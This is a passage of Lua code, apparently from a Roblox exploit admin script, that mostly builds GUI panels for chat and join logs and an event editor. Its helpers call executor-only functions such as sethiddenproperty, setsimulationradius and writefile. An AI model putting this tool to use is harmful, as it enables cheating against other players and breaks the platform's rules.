	ExitImage_5.ZIndex = 10

	logs.Name = randomString()
	logs.Parent = PARENT
	logs.Active = true
	logs.BackgroundTransparency = 1
	logs.Position = UDim2.new(0, 0, 1, 10)
	logs.Size = UDim2.new(0, 338, 0, 20)
	logs.ZIndex = 10

	shadow.Name = "shadow"
	shadow.Parent = logs
	shadow.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	shadow.BorderSizePixel = 0
	shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
	shadow.Size = UDim2.new(0, 338, 0, 20)
	shadow.ZIndex = 10
	table.insert(shade2,shadow)

	Hide.Name = "Hide"
	Hide.Parent = shadow
	Hide.BackgroundTransparency = 1
	Hide.Position = UDim2.new(1, -40, 0, 0)
	Hide.Size = UDim2.new(0, 20, 0, 20)
	Hide.ZIndex = 10
	Hide.Text = ""

	ImageLabel.Parent = Hide
	ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel.BackgroundTransparency = 1
	ImageLabel.Position = UDim2.new(0, 3, 0, 3)
	ImageLabel.Size = UDim2.new(0, 14, 0, 14)
	ImageLabel.Image = "rbxassetid://2406617031"
	ImageLabel.ZIndex = 10

	PopupText.Name = "PopupText"
	PopupText.Parent = shadow
	PopupText.BackgroundTransparency = 1
	PopupText.Size = UDim2.new(1, 0, 0.949999988, 0)
	PopupText.ZIndex = 10
	PopupText.Font = Enum.Font.SourceSans
	PopupText.FontSize = Enum.FontSize.Size14
	PopupText.Text = "Logs"
	PopupText.TextColor3 = Color3.new(1, 1, 1)
	PopupText.TextWrapped = true
	table.insert(text1,PopupText)

	Exit.Name = "Exit"
	Exit.Parent = shadow
	Exit.BackgroundTransparency = 1
	Exit.Position = UDim2.new(1, -20, 0, 0)
	Exit.Size = UDim2.new(0, 20, 0, 20)
	Exit.ZIndex = 10
	Exit.Text = ""

	ImageLabel_2.Parent = Exit
	ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel_2.BackgroundTransparency = 1
	ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
	ImageLabel_2.Size = UDim2.new(0, 10, 0, 10)
	ImageLabel_2.Image = "rbxassetid://5054663650"
	ImageLabel_2.ZIndex = 10

	background.Name = "background"
	background.Parent = logs
	background.Active = true
	background.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	background.BorderSizePixel = 0
	background.ClipsDescendants = true
	background.Position = UDim2.new(0, 0, 1, 0)
	background.Size = UDim2.new(0, 338, 0, 245)
	background.ZIndex = 10

	chat.Name = "chat"
	chat.Parent = background
	chat.Active = true
	chat.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	chat.BorderSizePixel = 0
	chat.ClipsDescendants = true
	chat.Size = UDim2.new(0, 338, 0, 245)
	chat.ZIndex = 10
	table.insert(shade1,chat)

	Clear.Name = "Clear"
	Clear.Parent = chat
	Clear.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Clear.BorderSizePixel = 0
	Clear.Position = UDim2.new(0, 5, 0, 220)
	Clear.Size = UDim2.new(0, 50, 0, 20)
	Clear.ZIndex = 10
	Clear.Font = Enum.Font.SourceSans
	Clear.FontSize = Enum.FontSize.Size14
	Clear.Text = "Clear"
	Clear.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Clear)
	table.insert(text1,Clear)

	SaveChatlogs.Name = "SaveChatlogs"
	SaveChatlogs.Parent = chat
	SaveChatlogs.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	SaveChatlogs.BorderSizePixel = 0
	SaveChatlogs.Position = UDim2.new(0, 258, 0, 220)
	SaveChatlogs.Size = UDim2.new(0, 75, 0, 20)
	SaveChatlogs.ZIndex = 10
	SaveChatlogs.Font = Enum.Font.SourceSans
	SaveChatlogs.FontSize = Enum.FontSize.Size14
	SaveChatlogs.Text = "Save To .txt"
	SaveChatlogs.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,SaveChatlogs)
	table.insert(text1,SaveChatlogs)

	Toggle.Name = "Toggle"
	Toggle.Parent = chat
	Toggle.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Toggle.BorderSizePixel = 0
	Toggle.Position = UDim2.new(0, 60, 0, 220)
	Toggle.Size = UDim2.new(0, 66, 0, 20)
	Toggle.ZIndex = 10
	Toggle.Font = Enum.Font.SourceSans
	Toggle.FontSize = Enum.FontSize.Size14
	Toggle.Text = "Disabled"
	Toggle.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Toggle)
	table.insert(text1,Toggle)

	scroll_2.Name = "scroll"
	scroll_2.Parent = chat
	scroll_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	scroll_2.BorderSizePixel = 0
	scroll_2.Position = UDim2.new(0, 5, 0, 25)
	scroll_2.Size = UDim2.new(0, 328, 0, 190)
	scroll_2.ZIndex = 10
	scroll_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
	scroll_2.ScrollBarThickness = 8
	scroll_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	table.insert(scroll,scroll_2)
	table.insert(shade2,scroll_2)

	join.Name = "join"
	join.Parent = background
	join.Active = true
	join.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	join.BorderSizePixel = 0
	join.ClipsDescendants = true
	join.Size = UDim2.new(0, 338, 0, 245)
	join.Visible = false
	join.ZIndex = 10
	table.insert(shade1,join)

	Toggle_2.Name = "Toggle"
	Toggle_2.Parent = join
	Toggle_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Toggle_2.BorderSizePixel = 0
	Toggle_2.Position = UDim2.new(0, 60, 0, 220)
	Toggle_2.Size = UDim2.new(0, 66, 0, 20)
	Toggle_2.ZIndex = 10
	Toggle_2.Font = Enum.Font.SourceSans
	Toggle_2.FontSize = Enum.FontSize.Size14
	Toggle_2.Text = "Disabled"
	Toggle_2.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Toggle_2)
	table.insert(text1,Toggle_2)

	Clear_2.Name = "Clear"
	Clear_2.Parent = join
	Clear_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Clear_2.BorderSizePixel = 0
	Clear_2.Position = UDim2.new(0, 5, 0, 220)
	Clear_2.Size = UDim2.new(0, 50, 0, 20)
	Clear_2.ZIndex = 10
	Clear_2.Font = Enum.Font.SourceSans
	Clear_2.FontSize = Enum.FontSize.Size14
	Clear_2.Text = "Clear"
	Clear_2.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Clear_2)
	table.insert(text1,Clear_2)

	scroll_3.Name = "scroll"
	scroll_3.Parent = join
	scroll_3.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	scroll_3.BorderSizePixel = 0
	scroll_3.Position = UDim2.new(0, 5, 0, 25)
	scroll_3.Size = UDim2.new(0, 328, 0, 190)
	scroll_3.ZIndex = 10
	scroll_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
	scroll_3.ScrollBarThickness = 8
	scroll_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	table.insert(scroll,scroll_3)
	table.insert(shade2,scroll_3)

	selectChat.Name = "selectChat"
	selectChat.Parent = background
	selectChat.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	selectChat.BorderSizePixel = 0
	selectChat.Position = UDim2.new(0, 5, 0, 5)
	selectChat.Size = UDim2.new(0, 164, 0, 20)
	selectChat.ZIndex = 10
	selectChat.Font = Enum.Font.SourceSans
	selectChat.FontSize = Enum.FontSize.Size14
	selectChat.Text = "Chat Logs"
	selectChat.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,selectChat)
	table.insert(text1,selectChat)

	selectJoin.Name = "selectJoin"
	selectJoin.Parent = background
	selectJoin.BackgroundColor3 = Color3.new(0.305882, 0.305882, 0.309804)
	selectJoin.BorderSizePixel = 0
	selectJoin.Position = UDim2.new(0, 169, 0, 5)
	selectJoin.Size = UDim2.new(0, 164, 0, 20)
	selectJoin.ZIndex = 10
	selectJoin.Font = Enum.Font.SourceSans
	selectJoin.FontSize = Enum.FontSize.Size14
	selectJoin.Text = "Join Logs"
	selectJoin.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade3,selectJoin)
	table.insert(text1,selectJoin)

	function create(data)
		local insts = {}
		for i,v in pairs(data) do insts[v[1]] = Instance.new(v[2]) end

		for _,v in pairs(data) do
			for prop,val in pairs(v[3]) do
				if type(val) == "table" then
					insts[v[1]][prop] = insts[val[1]]
				else
					insts[v[1]][prop] = val
				end
			end
		end

		return insts[1]
	end

	ViewportTextBox = (function()
		local textService = game:GetService("TextService")

		local funcs = {}
		funcs.Update = function(self)
			local cursorPos = self.TextBox.CursorPosition
			local text = self.TextBox.Text
			if text == "" then self.TextBox.Position = UDim2.new(0,2,0,0) return end
			if cursorPos == -1 then return end

			local cursorText = text:sub(1,cursorPos-1)
			local pos = nil
			local leftEnd = -self.TextBox.Position.X.Offset
			local rightEnd = leftEnd + self.View.AbsoluteSize.X

			local totalTextSize = textService:GetTextSize(text,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
			local cursorTextSize = textService:GetTextSize(cursorText,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X

			if cursorTextSize > rightEnd then
				pos = math.max(-2,cursorTextSize - self.View.AbsoluteSize.X + 2)
			elseif cursorTextSize < leftEnd then
				pos = math.max(-2,cursorTextSize-2)
			elseif totalTextSize < rightEnd then
				pos = math.max(-2,totalTextSize - self.View.AbsoluteSize.X + 2)
			end

			if pos then
				self.TextBox.Position = UDim2.new(0,-pos,0,0)
				self.TextBox.Size = UDim2.new(1,pos,1,0)
			end
		end

		local mt = {}
		mt.__index = funcs

		local function convert(textbox)
			local obj = setmetatable({OffsetX = 0, TextBox = textbox},mt)

			local view = Instance.new("Frame")
			view.BackgroundTransparency = textbox.BackgroundTransparency
			view.BackgroundColor3 = textbox.BackgroundColor3
			view.BorderSizePixel = textbox.BorderSizePixel
			view.BorderColor3 = textbox.BorderColor3
			view.Position = textbox.Position
			view.Size = textbox.Size
			view.ClipsDescendants = true
			view.Name = textbox.Name
			view.ZIndex = 10
			textbox.BackgroundTransparency = 1
			textbox.Position = UDim2.new(0,4,0,0)
			textbox.Size = UDim2.new(1,-8,1,0)
			textbox.TextXAlignment = Enum.TextXAlignment.Left
			textbox.Name = "Input"
			table.insert(text1,textbox)
			table.insert(shade2,view)

			obj.View = view

			textbox.Changed:Connect(function(prop)
				if prop == "Text" or prop == "CursorPosition" or prop == "AbsoluteSize" then
					obj:Update()
				end
			end)

			obj:Update()

			view.Parent = textbox.Parent
			textbox.Parent = view

			return obj
		end

		return {convert = convert}
	end)()

	ViewportTextBox.convert(Cmdbar).View.ZIndex = 10
	ViewportTextBox.convert(Cmdbar_2).View.ZIndex = 10

	IYMouse = Players.LocalPlayer:GetMouse()
	UserInputService = game:GetService("UserInputService")

	local sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
	local gethidden = gethiddenproperty or get_hidden_property or get_hidden_prop
	local setsimulation = setsimulationradius or set_simulation_radius

	function writefileExploit()
		if writefile then
			return true
		end
	end

	function isNumber(str)
		if tonumber(str) ~= nil or str == 'inf' then
			return true
		end
	end

	function getRoot(char)
		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
		return rootPart
	end

	function tools(plr)
		if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
			return true
		end
	end

	function r15(plr)
		if plr.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
			return true
		end
	end

	function toClipboard(String)
		local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
		if clipBoard then
			clipBoard(String)
			notify('Clipboard','Copied to clipboard')
		else
			notify('Clipboard',"Your exploit doesn't have the ability to use the clipboard")
		end
	end

	function getHierarchy(obj)
		local fullname
		local period

		if string.find(obj.Name,' ') then
			fullname = '["'..obj.Name..'"]'
			period = false
		else
			fullname = obj.Name
			period = true
		end

		local getS = obj
		local parent = obj
		local service = ''

		if getS.Parent ~= game then
			repeat
				getS = getS.Parent
				service = getS.ClassName
			until getS.Parent == game
		end

		if parent.Parent ~= getS then
			repeat
				parent = parent.Parent
				if string.find(tostring(parent),' ') then
					if period then
						fullname = '["'..parent.Name..'"].'..fullname
					else
						fullname = '["'..parent.Name..'"]'..fullname
					end
					period = false
				else
					if period then
						fullname = parent.Name..'.'..fullname
					else
						fullname = parent.Name..''..fullname
					end
					period = true
				end
			until parent.Parent == getS
		elseif string.find(tostring(parent),' ') then
			fullname = '["'..parent.Name..'"]'
			period = false
		end

		if period then
			return 'game:GetService("'..service..'").'..fullname
		else
			return 'game:GetService("'..service..'")'..fullname
		end
	end

	AllWaypoints = {}

	local cooldown = false
	function writefileCooldown(name,data)
		spawn(function()
			if not cooldown then
				cooldown = true
				writefile(name, data)
			else
				repeat wait() until cooldown == false
				writefileCooldown(name,data)
			end
			wait(3)
			cooldown = false
		end)
	end

	function dragGUI(gui)
		spawn(function()
			local dragging
			local dragInput
			local dragStart = Vector3.new(0,0,0)
			local startPos
			local function update(input)
				local delta = input.Position - dragStart
				local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
			end
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end)
	end

	dragGUI(logs)
	dragGUI(KeybindEditor)
	dragGUI(PluginEditor)
	dragGUI(ToPartFrame)

	eventEditor = (function()
		local events = {}

		local function registerEvent(name,sets)
			events[name] = {
				commands = {},
				sets = sets or {}
			}
		end

		local onEdited = nil

		local function fireEvent(name,...)
			local args = {...}
			local event = events[name]
			if event then
				for i,cmd in pairs(event.commands) do
					local metCondition = true
					for idx,set in pairs(event.sets) do
						local argVal = args[idx]
						local cmdSet = cmd[2][idx]
						local condType = set.Type
						if condType == "Player" then
							if cmdSet == 0 then
								metCondition = metCondition and (tostring(Players.LocalPlayer) == argVal)
							elseif cmdSet ~= 1 then
								metCondition = metCondition and table.find(getPlayer(cmdSet,Players.LocalPlayer),argVal)
							end
						elseif condType == "String" then
							if cmdSet ~= 0 then
								metCondition = metCondition and string.find(argVal:lower(),cmdSet:lower())
							end
						elseif condType == "Number" then
							if cmdSet ~= 0 then
								metCondition = metCondition and tonumber(argVal)<=tonumber(cmdSet)
							end
						end
						if not metCondition then break end
					end

					if metCondition then
						pcall(coroutine.wrap(function()
							local cmdStr = cmd[1]
							for count,arg in pairs(args) do
								cmdStr = cmdStr:gsub("%$"..count,arg)
							end
							wait(cmd[3] or 0)
							execCmd(cmdStr)
						end))
					end
				end
			end
		end

		local main = create({
			{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderSizePixel=0,Name="EventEditor",Position=UDim2.new(0.5,-175,0,-500),Size=UDim2.new(0,350,0,20),ZIndex=10,}},
			{2,"Frame",{BackgroundColor3=currentShade2,BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0.95,0),Text="Event Editor",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=Enum.TextXAlignment.Center,ZIndex=10,}},
			{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
			{6,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,202),ZIndex=10,}},
			{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={6},Position=UDim2.new(0,5,0,5),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,-10,1,-10),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
			{8,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={7},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{9,"UIListLayout",{Parent={8},SortOrder=2,}},
			{10,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,ClipsDescendants=true,Name="Settings",Parent={6},Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,150,1,0),ZIndex=10,}},
			{11,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),Name="Slider",Parent={10},Position=UDim2.new(0,-150,0,0),Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{12,"Frame",{BackgroundColor3=Color3.new(0.23529413342476,0.23529413342476,0.23529413342476),BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,Name="Line",Parent={11},Size=UDim2.new(0,1,1,0),ZIndex=10,}},
			{13,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={11},Position=UDim2.new(0,0,0,25),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,-25),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
			{14,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={13},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{15,"UIListLayout",{Parent={14},SortOrder=2,}},
			{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={11},Size=UDim2.new(1,0,0,20),Text="Event Settings",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{17,"TextButton",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Font=3,Name="Close",BorderSizePixel=0,Parent={11},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="<",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{18,"Folder",{Name="Templates",Parent={10},}},
			{19,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Players",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,86),Visible=false,ZIndex=10,}},
			{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={19},Size=UDim2.new(1,0,0,20),Text="Choose Players",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{21,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={19},Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-10,0,20),Text="Any Player",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{22,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={21},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{23,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={22},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{24,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Me",Parent={19},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Me Only",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{25,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={24},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{26,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={25},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{27,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={19},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Custom Player Set",Position=UDim2.new(0,5,0,64),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{28,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={19},Position=UDim2.new(1,-25,0,64),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{29,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={28},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{30,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Strings",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
			{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={30},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{32,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={30},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any String",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{33,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={32},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{34,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={33},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{54,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Numbers",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
			{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={54},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{56,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={54},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any Number",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{57,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={56},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{58,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={57},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{59,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={54},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Number",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{60,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={54},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{61,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={60},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{35,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={30},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Match String",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{36,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={30},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{37,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={36},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{38,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="DelayEditor",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,24),Visible=false,ZIndex=10,}},
